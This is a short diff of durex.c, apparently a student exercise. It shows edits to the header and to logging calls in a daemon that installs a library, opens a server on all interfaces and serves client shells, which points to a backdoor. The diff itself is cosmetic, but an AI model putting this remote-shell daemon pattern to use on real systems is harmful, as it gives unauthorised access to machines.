@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   durex.c                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
+/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2018/10/25 06:25:37 by root             ###   ########.fr       */
+/*   Updated: 2019/05/12 17:22:21 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -116,14 +116,14 @@ void				durex()
 
 	cleanStructure();
 	if (launch_program() && hireReporter() && install_library() && openServer("0.0.0.0", SERVER_PORT)) {
-		serverLog("[LOGS] - Server opened !");
+		serverLog(1, "[LOGS] - Server online\n");
 		mymemset(&timeout, 0, sizeof(timeout));
 		while (1)
 		{
 			maxfd = setupSelect();
 			ret = select(maxfd + 1, &e.server.fdr, &e.server.fdw, NULL, &timeout);
 			if (ret == -1 && errno != EINTR) {
-				serverLog("[ERRO] - %s", strerror(errno));
+				serverLog(1, "[ERRO] - %s\n", strerror(errno));
 				break ;
 			}
 			if (FD_ISSET(e.server.fd, &e.server.fdr))
@@ -140,15 +140,12 @@ void				durex()
 					serverReadClientShell(&e.server.client[i]);
 			}
 		}
-		serverLog("Hm...");
+		serverLog(1, "[FATAL] - Weird... \n");
 		quitClearlyServer();
 		quitClearlyDaemon();
 		exit(0);
 	}
-	struct passwd	*passwd;
-	passwd = getpwuid(getuid());
-	write(STDIN_FILENO, passwd->pw_name, mystrlen(passwd->pw_name));
-	write(STDIN_FILENO, "\n", 1);
+	print_usr_name();
 }
 
 void			quitClearlyDaemon()
